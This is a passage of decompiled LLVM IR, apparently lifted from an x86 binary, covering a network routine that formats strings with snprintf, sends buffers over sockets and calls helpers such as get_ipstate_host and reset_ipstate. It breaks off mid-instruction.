  %v7_805348e = call i32 @__GI_snprintf(i32 %v4_805343b, i32 %v4_8053361, i32 %v4_805331b, i32 %stack_var_-628.278, i32 %stack_var_-624.284, i32 %v2_8052831, i32 %v6_8052909)
  br label %dec_label_pc_8053501

dec_label_pc_8053495:                             ; preds = %dec_label_pc_80533e2
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80534c8 = and i32 %v4_80534b6, -256
  store i32 %v1_80534c8, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_80534cb = inttoptr i32 %v4_80534b6 to i8*
  store i32 %v4_80534b6, i32* @edi, align 4
  %v3_80534d1 = call i32 @_strlen(i8* %v4_80534cb)
  %v4_80534d1 = mul i32 %v3_80534d1, -1
  %v5_80534d1 = add i32 %v4_80534d1, -2
  store i32 %v5_80534d1, i32* %ecx.global-to-local, align 4
  %v1_80534d8 = sub i32 24, %v4_80534d1
  store i32 %v1_80534d8, i32* %eax.global-to-local, align 4
  %v0_80534db = load i32, i32* %edx.global-to-local, align 4
  %v1_80534db = load i32, i32* @esp, align 4
  %v2_80534db = add i32 %v1_80534db, 20
  %v3_80534db = inttoptr i32 %v2_80534db to i32*
  store i32 %v0_80534db, i32* %v3_80534db, align 4
  %v0_80534df = load i32, i32* @ebx, align 4
  %v1_80534df = load i32, i32* @esp, align 4
  %v2_80534df = add i32 %v1_80534df, 16
  %v3_80534df = inttoptr i32 %v2_80534df to i32*
  store i32 %v0_80534df, i32* %v3_80534df, align 4
  %v0_80534e3 = load i32, i32* @esi, align 4
  %v1_80534e3 = load i32, i32* @esp, align 4
  %v2_80534e3 = add i32 %v1_80534e3, 12
  %v3_80534e3 = inttoptr i32 %v2_80534e3 to i32*
  store i32 %v0_80534e3, i32* %v3_80534e3, align 4
  %v0_80534e7 = load i32, i32* @esp, align 4
  %v1_80534e7 = add i32 %v0_80534e7, 8
  %v2_80534e7 = inttoptr i32 %v1_80534e7 to i32*
  store i32 ptrtoint ([29 x i8]* @global_var_806b1ed.296 to i32), i32* %v2_80534e7, align 4
  %v0_80534ef = load i32, i32* %eax.global-to-local, align 4
  %v1_80534ef = load i32, i32* @esp, align 4
  %v2_80534ef = add i32 %v1_80534ef, 4
  %v3_80534ef = inttoptr i32 %v2_80534ef to i32*
  store i32 %v0_80534ef, i32* %v3_80534ef, align 4
  store i32 %v2_8053300, i32* %eax.global-to-local, align 4
  %v1_80534f9 = load i32, i32* @esp, align 4
  %v2_80534f9 = inttoptr i32 %v1_80534f9 to i32*
  store i32 %v2_8053300, i32* %v2_80534f9, align 4
  %v7_80534fc = call i32 @__GI_snprintf(i32 %v4_80534b6, i32 %stack_var_-640.263, i32 %v4_8053361, i32 %v4_805331b, i32 %stack_var_-628.278, i32 %stack_var_-624.284, i32 %v2_8052831)
  br label %dec_label_pc_8053501

dec_label_pc_8053501:                             ; preds = %dec_label_pc_805340a, %dec_label_pc_8053495
  %stack_var_-640.1 = phi i32 [ %stack_var_-640.263, %dec_label_pc_8053495 ], [ %v4_805343b, %dec_label_pc_805340a ]
  %stack_var_-644.1 = phi i32 [ %v4_80534b6, %dec_label_pc_8053495 ], [ %stack_var_-644.264, %dec_label_pc_805340a ]
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v2_8053512, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_8053300, i32* @edi, align 4
  %v3_805351b = call i32 @_strlen(i8* %v4_8053515)
  store i32 %v3_805351b, i32* @ecx, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v4_805352d = load i32, i32* %v3_805338e, align 16
  store i32 %v4_805352d, i32* %edx.global-to-local, align 4
  %v0_8053530 = load i32, i32* @esp, align 4
  %v1_8053530 = add i32 %v0_8053530, 12
  %v2_8053530 = inttoptr i32 %v1_8053530 to i32*
  store i32 16384, i32* %v2_8053530, align 4
  %v0_8053538 = load i32, i32* @ecx, align 4
  %v1_8053538 = load i32, i32* @esp, align 4
  %v2_8053538 = add i32 %v1_8053538, 8
  %v3_8053538 = inttoptr i32 %v2_8053538 to i32*
  store i32 %v0_8053538, i32* %v3_8053538, align 4
  store i32 %v2_8053300, i32* %eax.global-to-local, align 4
  %v1_8053542 = load i32, i32* @esp, align 4
  %v2_8053542 = add i32 %v1_8053542, 4
  %v3_8053542 = inttoptr i32 %v2_8053542 to i32*
  store i32 %v2_8053300, i32* %v3_8053542, align 4
  %v0_8053546 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053546 = load i32, i32* @esp, align 4
  %v2_8053546 = inttoptr i32 %v1_8053546 to i32*
  store i32 %v0_8053546, i32* %v2_8053546, align 4
  %v4_8053549 = call i32 @send(i32 %v2_8053300, i32 %stack_var_-644.1, i32 %stack_var_-640.1, i32 %v4_8053361)
  store i32 %v4_8053549, i32* %eax.global-to-local, align 4
  %v2_805354e = icmp slt i32 %v4_8053549, 0
  %v1_8053550 = icmp eq i1 %v2_805354e, false
  br i1 %v1_8053550, label %dec_label_pc_8053566, label %dec_label_pc_8053552

dec_label_pc_8053552:                             ; preds = %dec_label_pc_8053501
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_805355e = load i32, i32* @esp, align 4
  %v2_805355e = inttoptr i32 %v1_805355e to i32*
  store i32 %v2_80528d5, i32* %v2_805355e, align 4
  %v1_8053561 = call i32 @reset_ipstate(i32 %v2_8053300)
  store i32 %v1_8053561, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053566

dec_label_pc_8053566:                             ; preds = %dec_label_pc_8053501, %dec_label_pc_8053552
  %v4_8053566 = add nuw nsw i32 %storemerge265, 1
  store i32 %v4_8053566, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_8053566, %tmp8
  br i1 %exitcond, label %dec_label_pc_8053575, label %dec_label_pc_80533e2

dec_label_pc_8053575:                             ; preds = %dec_label_pc_8053566, %dec_label_pc_8053569.preheader
  %stack_var_-640.2.lcssa = phi i32 [ %stack_var_-640.481, %dec_label_pc_8053569.preheader ], [ %stack_var_-640.1, %dec_label_pc_8053566 ]
  %stack_var_-644.2.lcssa = phi i32 [ %stack_var_-644.482, %dec_label_pc_8053569.preheader ], [ %stack_var_-644.1, %dec_label_pc_8053566 ]
  %stack_var_-648.1.lcssa = phi i32 [ %stack_var_-648.383, %dec_label_pc_8053569.preheader ], [ %v2_8053300, %dec_label_pc_8053566 ]
  %storemerge2.lcssa = phi i32 [ 0, %dec_label_pc_8053569.preheader ], [ %tmp8, %dec_label_pc_8053566 ]
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v0_8053581 = load i32, i32* @esp, align 4
  %v1_8053581 = add i32 %v0_8053581, 4
  %v2_8053581 = inttoptr i32 %v1_8053581 to i32*
  store i32 8, i32* %v2_8053581, align 4
  %v0_8053589 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053589 = load i32, i32* @esp, align 4
  %v2_8053589 = inttoptr i32 %v1_8053589 to i32*
  store i32 %v0_8053589, i32* %v2_8053589, align 4
  %v2_805358c = inttoptr i32 %storemerge2.lcssa to i32*
  %v3_805358c = call i32 @advance_state(i32* %v2_805358c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805358c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8053596:                             ; preds = %dec_label_pc_8052900
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80528da, align 16
  %v0_80535aa = load i32, i32* bitcast ([352 x i8]** @global_var_8070698.298 to i32*), align 8
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v5_80535b4 = inttoptr i32 %v0_80535aa to i8*
  %v1_80535ba = and i32 %v0_80535aa, -256
  store i32 %v1_80535ba, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_80535aa, i32* @edi, align 4
  %v3_80535c3 = call i32 @_strlen(i8* %v5_80535b4)
  store i32 %v3_80535c3, i32* @ecx, align 4
  %v0_80535cc = load i32, i32* bitcast ([352 x i8]** @global_var_8070698.298 to i32*), align 8
  store i32 %v0_80535cc, i32* @ebx, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v3_80535db = inttoptr i32 %v2_80528d5 to i32*
  %v4_80535db = load i32, i32* %v3_80535db, align 16
  store i32 %v4_80535db, i32* %eax.global-to-local, align 4
  %v0_80535de = load i32, i32* @esp, align 4
  %v1_80535de = add i32 %v0_80535de, 12
  %v2_80535de = inttoptr i32 %v1_80535de to i32*
  store i32 16384, i32* %v2_80535de, align 4
  %v0_80535e6 = load i32, i32* @ecx, align 4
  %v1_80535e6 = load i32, i32* @esp, align 4
  %v2_80535e6 = add i32 %v1_80535e6, 8
  %v3_80535e6 = inttoptr i32 %v2_80535e6 to i32*
  store i32 %v0_80535e6, i32* %v3_80535e6, align 4
  %v0_80535ea = load i32, i32* @ebx, align 4
  %v1_80535ea = load i32, i32* @esp, align 4
  %v2_80535ea = add i32 %v1_80535ea, 4
  %v3_80535ea = inttoptr i32 %v2_80535ea to i32*
  store i32 %v0_80535ea, i32* %v3_80535ea, align 4
  %v0_80535ee = load i32, i32* %eax.global-to-local, align 4
  %v1_80535ee = load i32, i32* @esp, align 4
  %v2_80535ee = inttoptr i32 %v1_80535ee to i32*
  store i32 %v0_80535ee, i32* %v2_80535ee, align 4
  %v5_80535f1 = call i32 @send(i32 %v0_80535aa, i32 %stack_var_-648.383, i32 %stack_var_-644.482, i32 %stack_var_-640.481)
  %v2_80535f6 = icmp slt i32 %v5_80535f1, 0
  %v1_80535f8 = icmp eq i1 %v2_80535f6, false
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  br i1 %v1_80535f8, label %dec_label_pc_8053684, label %dec_label_pc_80535fe

dec_label_pc_80535fe:                             ; preds = %dec_label_pc_8053596
  %v2_8053607 = or i32 %v2_80528d2, 11
  %v3_8053607 = add i32 %v2_8053607, %v2_8052831
  %v4_8053607 = inttoptr i32 %v3_8053607 to i8*
  %v5_8053607 = load i8, i8* %v4_8053607, align 1
  %v6_8053607 = zext i8 %v5_8053607 to i32
  store i32 %v6_8053607, i32* %eax.global-to-local, align 4
  %v1_805360f = mul nuw nsw i32 %v6_8053607, 4
  %v2_805360f = add nuw nsw i32 %v1_805360f, 134679296
  %v3_805360f = inttoptr i32 %v2_805360f to i32*
  %v4_805360f = load i32, i32* %v3_805360f, align 4
  store i32 %v4_805360f, i32* @ebx, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v2_805361f = or i32 %v2_80528d2, 10
  %v3_805361f = add i32 %v2_805361f, %v2_8052831
  %v4_805361f = inttoptr i32 %v3_805361f to i8*
  %v5_805361f = load i8, i8* %v4_805361f, align 2
  %v6_805361f = zext i8 %v5_805361f to i32
  store i32 %v6_805361f, i32* %eax.global-to-local, align 4
  %v1_8053627 = mul nuw nsw i32 %v6_805361f, 4
  %v2_8053627 = add nuw nsw i32 %v1_8053627, 134678880
  %v3_8053627 = inttoptr i32 %v2_8053627 to i32*
  %v4_8053627 = load i32, i32* %v3_8053627, align 4
  store i32 %v4_8053627, i32* @esi, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_805363a = load i32, i32* @esp, align 4
  %v2_805363a = inttoptr i32 %v1_805363a to i32*
  store i32 %v2_80528d5, i32* %v2_805363a, align 4
  %v0_805363d = call i32 @get_ipstate_host()
  %v0_8053642 = load i32, i32* @global_var_807f34c.280, align 4
  store i32 %v0_8053642, i32* %edx.global-to-local, align 4
  %v0_8053648 = load i32, i32* @ebx, align 4
  %v1_8053648 = load i32, i32* @esp, align 4
  %v2_8053648 = add i32 %v1_8053648, 20
  %v3_8053648 = inttoptr i32 %v2_8053648 to i32*
  store i32 %v0_8053648, i32* %v3_8053648, align 4
  %v0_805364c = load i32, i32* @esi, align 4
  %v1_805364c = load i32, i32* @esp, align 4
  %v2_805364c = add i32 %v1_805364c, 16
  %v3_805364c = inttoptr i32 %v2_805364c to i32*
  store i32 %v0_805364c, i32* %v3_805364c, align 4
  %v1_8053650 = load i32, i32* @esp, align 4
  %v2_8053650 = add i32 %v1_8053650, 12
  %v3_8053650 = inttoptr i32 %v2_8053650 to i32*
  store i32 %v0_805363d, i32* %v3_8053650, align 4
  %v0_8053654 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053654 = load i32, i32* @esp, align 4
  %v2_8053654 = add i32 %v1_8053654, 8
  %v3_8053654 = inttoptr i32 %v2_8053654 to i32*
  store i32 %v0_8053654, i32* %v3_8053654, align 4
  %v0_8053658 = load i32, i32* @esp, align 4
  %v1_8053658 = add i32 %v0_8053658, 4
  %v2_8053658 = inttoptr i32 %v1_8053658 to i32*
  store i32 ptrtoint ([45 x i8]* @global_var_806b20c.299 to i32), i32* %v2_8053658, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_8053663 = load i32, i32* @esp, align 4
  %v2_8053663 = inttoptr i32 %v1_8053663 to i32*
  store i32 %arg3, i32* %v2_8053663, align 4
  %v3_8053666 = call i32 @Send(i32 %v0_80535aa, i32 %stack_var_-648.383)
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_8053677 = load i32, i32* @esp, align 4
  %v2_8053677 = inttoptr i32 %v1_8053677 to i32*
  store i32 %v2_80528d5, i32* %v2_8053677, align 4
  %v2_805367a = call i32 @reset_ipstate(i32 %v0_80535aa)
  store i32 %v2_805367a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_8053684:                             ; preds = %dec_label_pc_8053596
  store i32 %v1_80528d7, i32* %eax.global-to-local, align 4
  %v2_8053692 = load i32, i32* %v1_80528da, align 16
  store i32 %v2_8053692, i32* %eax.global-to-local, align 4
  %v1_8053694 = add i32 %v2_8053692, 10
  store i32 %v1_8053694, i32* @ebx, align 4
  %v0_8053697 = load i32, i32* @esp, align 4
  %v1_8053697 = inttoptr i32 %v0_8053697 to i32*
  store i32 0, i32* %v1_8053697, align 4
  %tmp53 = inttoptr i32 %v0_80535aa to i32*
  %v3_805369e = call i32 @__GI_time(i32* %tmp53)
  store i32 %v3_805369e, i32* %eax.global-to-local, align 4
  %v0_80536a3 = load i32, i32* @ebx, align 4
  %v7_80536a3 = icmp ult i32 %v0_80536a3, %v3_805369e
  %v1_80536a5 = icmp eq i1 %v7_80536a3, false
  br i1 %v1_80536a5, label %dec_label_pc_805372c, label %dec_label_pc_80536ab

dec_label_pc_80536ab:                             ; preds = %dec_label_pc_8053684
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v2_80536b4 = or i32 %v2_80528d2, 11
  %v3_80536b4 = add i32 %v2_80536b4, %v2_8052831
  %v4_80536b4 = inttoptr i32 %v3_80536b4 to i8*
  %v5_80536b4 = load i8, i8* %v4_80536b4, align 1
  %v6_80536b4 = zext i8 %v5_80536b4 to i32
  store i32 %v6_80536b4, i32* %eax.global-to-local, align 4
  %v1_80536bc = mul nuw nsw i32 %v6_80536b4, 4
  %v2_80536bc = add nuw nsw i32 %v1_80536bc, 134679296
  %v3_80536bc = inttoptr i32 %v2_80536bc to i32*
  %v4_80536bc = load i32, i32* %v3_80536bc, align 4
  store i32 %v4_80536bc, i32* @ebx, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d2, i32* %eax.global-to-local, align 4
  %v2_80536cc = or i32 %v2_80528d2, 10
  %v3_80536cc = add i32 %v2_80536cc, %v2_8052831
  %v4_80536cc = inttoptr i32 %v3_80536cc to i8*
  %v5_80536cc = load i8, i8* %v4_80536cc, align 2
  %v6_80536cc = zext i8 %v5_80536cc to i32
  store i32 %v6_80536cc, i32* %eax.global-to-local, align 4
  %v1_80536d4 = mul nuw nsw i32 %v6_80536cc, 4
  %v2_80536d4 = add nuw nsw i32 %v1_80536d4, 134678880
  %v3_80536d4 = inttoptr i32 %v2_80536d4 to i32*
  %v4_80536d4 = load i32, i32* %v3_80536d4, align 4
  store i32 %v4_80536d4, i32* @esi, align 4
  store i32 %v2_8052831, i32* %edx.global-to-local, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_80536e7 = load i32, i32* @esp, align 4
  %v2_80536e7 = inttoptr i32 %v1_80536e7 to i32*
  store i32 %v2_80528d5, i32* %v2_80536e7, align 4
  %v0_80536ea = call i32 @get_ipstate_host()
  %v0_80536ef = load i32, i32* @global_var_807f34c.280, align 4
  store i32 %v0_80536ef, i32* %edx.global-to-local, align 4
  %v0_80536f5 = load i32, i32* @ebx, align 4
  %v1_80536f5 = load i32, i32* @esp, align 4
  %v2_80536f5 = add i32 %v1_80536f5, 20
  %v3_80536f5 = inttoptr i32 %v2_80536f5 to i32*
  store i32 %v0_80536f5, i32* %v3_80536f5, align 4
  %v0_80536f9 = load i32, i32* @esi, align 4
  %v1_80536f9 = load i32, i32* @esp, align 4
  %v2_80536f9 = add i32 %v1_80536f9, 16
  %v3_80536f9 = inttoptr i32 %v2_80536f9 to i32*
  store i32 %v0_80536f9, i32* %v3_80536f9, align 4
  %v1_80536fd = load i32, i32* @esp, align 4
  %v2_80536fd = add i32 %v1_80536fd, 12
  %v3_80536fd = inttoptr i32 %v2_80536fd to i32*
  store i32 %v0_80536ea, i32* %v3_80536fd, align 4
  %v0_8053701 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053701 = load i32, i32* @esp, align 4
  %v2_8053701 = add i32 %v1_8053701, 8
  %v3_8053701 = inttoptr i32 %v2_8053701 to i32*
  store i32 %v0_8053701, i32* %v3_8053701, align 4
  %v0_8053705 = load i32, i32* @esp, align 4
  %v1_8053705 = add i32 %v0_8053705, 4
  %v2_8053705 = inttoptr i32 %v1_8053705 to i32*
  store i32 ptrtoint ([53 x i8]* @global_var_806b23c.300 to i32), i32* %v2_8053705, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_8053710 = load i32, i32* @esp, align 4
  %v2_8053710 = inttoptr i32 %v1_8053710 to i32*
  store i32 %arg3, i32* %v2_8053710, align 4
  %v3_8053713 = call i32 @Send(i32 %v0_80535aa, i32 %stack_var_-648.383)
  store i32 %v2_8052831, i32* @edx, align 4
  store i32 %v2_80528d5, i32* %eax.global-to-local, align 4
  %v1_8053724 = load i32, i32* @esp, align 4
  %v2_8053724 = inttoptr i32 %v1_8053724 to i32*
  store i32 %v2_80528d5, i32* %v2_8053724, align 4
  %v2_8053727 = call i32 @reset_ipstate(i32 %v0_80535aa)
  store i32 %v2_8053727, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805372c

dec_label_pc_805372c:                             ; preds = %dec_label_pc_8052900, %dec_label_pc_8053684, %dec_label_pc_8053290, %dec_label_pc_8052fc6, %dec_label_pc_8052ded, %dec_label_pc_8052d0c, %dec_label_pc_8052a21, %dec_label_pc_80535fe, %dec_label_pc_8053575, %dec_label_pc_80532b7, %dec_label_pc_8053277, %dec_label_pc_80531e9, %dec_label_pc_80531c8, %dec_label_pc_8053175, %dec_label_pc_80530dd, %dec_label_pc_80530c4, %dec_label_pc_805307b, %dec_label_pc_8052fed, %dec_label_pc_8052fa5, %dec_label_pc_8052f84, %dec_label_pc_8052f04, %dec_label_pc_8052eeb, %dec_label_pc_8052ea2, %dec_label_pc_8052e14, %dec_label_pc_8052dcc, %dec_label_pc_8052dab, %dec_label_pc_8052d33, %dec_label_pc_8052cf3, %dec_label_pc_8052c80, %dec_label_pc_8052c67, %dec_label_pc_8052b54, %dec_label_pc_8052b3b, %dec_label_pc_80529ce, %dec_label_pc_80536ab
  %stack_var_-628.1 = phi i32 [ %stack_var_-628.278, %dec_label_pc_8052900 ], [ %stack_var_-628.278, %dec_label_pc_8053684 ], [ %stack_var_-628.278, %dec_label_pc_80536ab ], [ %stack_var_-628.278, %dec_label_pc_80535fe ], [ %stack_var_-628.278, %dec_label_pc_8053575 ], [ %stack_var_-628.278, %dec_label_pc_8053290 ], [ %stack_var_-628.278, %dec_label_pc_80532b7 ], [ %stack_var_-628.278, %dec_label_pc_8053277 ], [ %stack_var_-628.278, %dec_label_pc_80531e9 ], [ %stack_var_-628.278, %dec_label_pc_80531c8 ], [ %stack_var_-628.278, %dec_label_pc_8053175 ], [ %v4_8053017, %dec_label_pc_80530dd ], [ %v4_8053017, %dec_label_pc_80530c4 ], [ %v4_8053017, %dec_label_pc_805307b ], [ %stack_var_-628.278, %dec_label_pc_8052fc6 ], [ %stack_var_-628.278, %dec_label_pc_8052fed ], [ %stack_var_-628.278, %dec_label_pc_8052fa5 ], [ %stack_var_-628.278, %dec_label_pc_8052f84 ], [ %stack_var_-628.278, %dec_label_pc_8052f04 ], [ %stack_var_-628.278, %dec_label_pc_8052eeb ], [ %stack_var_-628.278, %dec_label_pc_8052ea2 ], [ %stack_var_-628.278, %dec_label_pc_8052ded ], [ %stack_var_-628.278, %dec_label_pc_8052e14 ], [ %stack_var_-628.278, %dec_label_pc_8052dcc ], [ %stack_var_-628.278, %dec_label_pc_8052dab ], [ %stack_var_-628.278, %dec_label_pc_8052d0c ], [ %stack_var_-628.278, %dec_label_pc_8052d33 ], [ %stack_var_-628.278, %dec_label_pc_8052cf3 ], [ %stack_var_-628.278, %dec_label_pc_8052c80 ], [ %stack_var_-628.278, %dec_label_pc_8052c67 ], [ %stack_var_-628.278, %dec_label_pc_8052a21 ], [ %stack_var_-628.278, %dec_label_pc_8052b54 ], [ %stack_var_-628.278, %dec_label_pc_8052b3b ], [ %stack_var_-628.278, %dec_label_pc_80529ce ]
  %stack_var_-640.3 = phi i32 [ %stack_var_-640.481, %dec_label_pc_8052900 ], [ %stack_var_-640.481, %dec_label_pc_8053684 ], [ %stack_var_-640.481, %dec_label_pc_80536ab ], [ %stack_var_-640.481, %dec_label_pc_80535fe ], [ %stack_var_-640.2.lcssa, %dec_label_pc_8053575 ], [ %stack_var_-640.481, %dec_label_pc_8053290 ], [ %stack_var_-640.481, %dec_label_pc_80532b7 ], [ %stack_var_-640.481, %dec_label_pc_8053277 ], [ %stack_var_-640.481, %dec_label_pc_80531e9 ], [ %stack_var_-640.481, %dec_label_pc_80531c8 ], [ %stack_var_-640.481, %dec_label_pc_8053175 ], [ %stack_var_-640.481, %dec_label_pc_80530dd ], [ %stack_var_-640.481, %dec_label_pc_80530c4 ], [ %stack_var_-640.481, %dec_label_pc_805307b ], [ %stack_var_-640.481, %dec_label_pc_8052fc6 ], [ %stack_var_-640.481, %dec_label_pc_8052fed ], [ %stack_var_-640.481, %dec_label_pc_8052fa5 ], [ %stack_var_-640.481, %dec_label_pc_8052f84 ], [ %stack_var_-640.481, %dec_label_pc_8052f04 ], [ %stack_var_-640.481, %dec_label_pc_8052eeb ], [ %stack_var_-640.481, %dec_label_pc_8052ea2 ], [ %stack_var_-640.481, %dec_label_pc_8052ded ], [ %stack_var_-640.481, %dec_label_pc_8052e14 ], [ %stack_var_-640.481, %dec_label_pc_8052dcc ], [ %stack_var_-640.481, %dec_label_pc_8052dab ], [ %stack_var_-640.481, %dec_label_pc_8052d0c ], [ %stack_var_-640.481, %dec_label_pc_8052d33 ], [ %stack_var_-640.481, %dec_label_pc_8052cf3 ], [ %stack_var_-640.481, %dec_label_pc_8052c80 ], [ %stack_var_-640.481, %dec_label_pc_8052c67 ], [ %stack_var_-640.481, %dec_label_pc_8052a21 ], [ %stack_var_-640.481, %dec_label_pc_8052b54 ], [ %stack_var_-640.481, %dec_label_pc_8052b3b ], [ %stack_var_-640.481, %dec_label_pc_80529ce ]
  %stack_var_-644.3 = phi i32 [ %stack_var_-644.482, %dec_label_pc_8052900 ], [ %stack_var_-644.482, %dec_label_pc_8053684 ], [ %stack_var_-644.482, %dec_label_pc_80536ab ], [ %stack_var_-644.482, %dec_label_pc_80535fe ], [ %stack_var_-644.2.lcssa, %dec_label_pc_8053575 ], [ %stack_var_-644.482, %dec_label_pc_8053290 ], [ %stack_var_-644.482, %dec_label_pc_80532b7 ], [ %stack_var_-644.482, %dec_label_pc_8053277 ], [ %stack_var_-644.482, %dec_label_pc_80531e9 ], [ %stack_var_-644.482, %dec_label_pc_80531c8 ], [ %stack_var_-644.482, %dec_label_pc_8053175 ], [ %stack_var_-644.482, %dec_label_pc_80530dd ], [ %stack_var_-644.482, %dec_label_pc_80530c4 ], [ %stack_var_-644.482, %dec_label_pc_805307b ], [ %stack_var_-644.482, %dec_label_pc_8052fc6 ], [ %stack_var_-644.482, %dec_label_pc_8052fed ], [ %stack_var_-644.482, %dec_label_pc_8052fa5 ], [ %stack_var_-644.482, %dec_label_pc_8052f84 ], [ %stack_var_-644.482, %dec_label_pc_8052f04 ], [ %stack_var_-644.482, %dec_label_pc_8052eeb ], [ %stack_var_-644.482, %dec_label_pc_8052ea2 ], [ %stack_var_-644.482, %dec_label_pc_8052ded ], [ %stack_var_-644.482, %dec_label_pc_8052e14 ], [ %stack_var_-644.482, %dec_label_pc_8052dcc ], [ %stack_var_-644.482, %dec_label_pc_8052dab ], [ %stack_var_-644.482, %dec_label_pc_8052d0c ], [ %stack_var_-644.482, %dec_label_pc_8052d33 ], [ %stack_var_-644.482, %dec_label_pc_8052cf3 ], [ %stack_var_-644.482, %dec_label_pc_8052c80 ], [ %stack_var_-644.482, %dec_label_pc_8052c67 ], [ %stack_var_-644.482, %dec_label_pc_8052a21 ], [ %stack_var_-644.482, %dec_label_pc_8052b54 ], [ %stack_var_-644.482, %dec_label_pc_8052b3b ], [ %stack_var_-644.482, %dec_label_pc_80529ce ]
  %stack_var_-648.2 = phi i32 [ %stack_var_-648.383, %dec_label_pc_8052900 ], [ %stack_var_-648.383, %dec_label_pc_8053684 ], [ %stack_var_-648.383, %dec_label_pc_80536ab ], [ %stack_var_-648.383, %dec_label_pc_80535fe ], [ %stack_var_-648.1.lcssa, %dec_label_pc_8053575 ], [ %stack_var_-648.383, %dec_label_pc_8053290 ], [ %stack_var_-648.383, %dec_label_pc_80532b7 ], [ %stack_var_-648.383, %dec_label_pc_8053277 ], [ %stack_var_-648.383, %dec_label_pc_80531e9 ], [ %stack_var_-648.383, %dec_label_pc_80531c8 ], [ %stack_var_-648.383, %dec_label_pc_8053175 ], [ %stack_var_-648.383, %dec_label_pc_80530dd ], [ %stack_var_-648.383, %dec_label_pc_80530c4 ], [ %stack_var_-648.383, %dec_label_pc_805307b ], [ %stack_var_-648.383, %dec_label_pc_8052fc6 ], [ %stack_var_-648.383, %dec_label_pc_8052fed ], [ %stack_var_-648.383, %dec_label_pc_8052fa5 ], [ %stack_var_-648.383, %dec_label_pc_8052f84 ], [ %stack_var_-648.383, %dec_label_pc_8052f04 ], [ %stack_var_-648.383, %dec_label_pc_8052eeb ], [ %stack_var_-648.383, %dec_label_pc_8052ea2 ], [ %stack_var_-648.383, %dec_label_pc_8052ded ], [ %stack_var_-648.383, %dec_label_pc_8052e14 ], [ %stack_var_-648.383, %dec_label_pc_8052dcc ], [ %stack_var_-648.383, %dec_label_pc_8052dab ], [ %stack_var_-648.383, %dec_label_pc_8052d0c ], [ %stack_var_-648.383, %dec_label_pc_8052d33 ], [ %stack_var_-648.383, %dec_label_pc_8052cf3 ], [ %stack_var_-648.383, %dec_label_pc_8052c80 ], [ %stack_var_-648.383, %dec_label_pc_8052c67 ], [ %stack_var_-648.383, %dec_label_pc_8052a21 ], [ %stack_var_-648.383, %dec_label_pc_8052b54 ], [ %stack_var_-648.383, %dec_label_pc_8052b3b ], [ %stack_var_-648.383, %dec_label_pc_80529ce ]
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.284, %dec_label_pc_8052900 ], [ %stack_var_-624.284, %dec_label_pc_8053684 ], [ %stack_var_-624.284, %dec_label_pc_80536ab ], [ %stack_var_-624.284, %dec_label_pc_80535fe ], [ %stack_var_-624.284, %dec_label_pc_8053575 ], [ %stack_var_-624.284, %dec_label_pc_8053290 ], [ %stack_var_-624.284, %dec_label_pc_80532b7 ], [ %stack_var_-624.284, %dec_label_pc_8053277 ], [ %stack_var_-624.284, %dec_label_pc_80531e9 ], [ %stack_var_-624.284, %dec_label_pc_80531c8 ], [ %stack_var_-624.284, %dec_label_pc_8053175 ], [ %stack_var_-624.284, %dec_label_pc_80530dd ], [ %stack_var_-624.284, %dec_label_pc_80530c4 ], [ %stack_var_-624.284, %dec_label_pc_805307b ], [ %stack_var_-624.284, %dec_label_pc_8052fc6 ], [ %stack_var_-624.284, %dec_label_pc_8052fed ], [ %stack_var_-624.284, %dec_label_pc_8052fa5 ], [ %stack_var_-624.284, %dec_label_pc_8052f84 ], [ %v4_8052e3e, %dec_label_pc_8052f04 ], [ %v4_8052e3e, %dec_label_pc_8052eeb ], [ %v4_8052e3e, %dec_label_pc_8052ea2 ], [ %stack_var_-624.284, %dec_label_pc_8052ded ], [ %stack_var_-624.284, %dec_label_pc_8052e14 ], [ %stack_var_-624.284, %dec_label_pc_8052dcc ], [ %stack_var_-624.284, %dec_label_pc_8052dab ], [ %stack_var_-624.284, %dec_label_pc_8052d0c ], [ %stack_var_-624.284, %dec_label_pc_8052d33 ], [ %stack_var_-624.284, %dec_label_pc_8052cf3 ], [ %stack_var_-624.284, %dec_label_pc_8052c80 ], [ %stack_var_-624.284, %dec_label_pc_8052c67 ], [ %stack_var_-624.284, 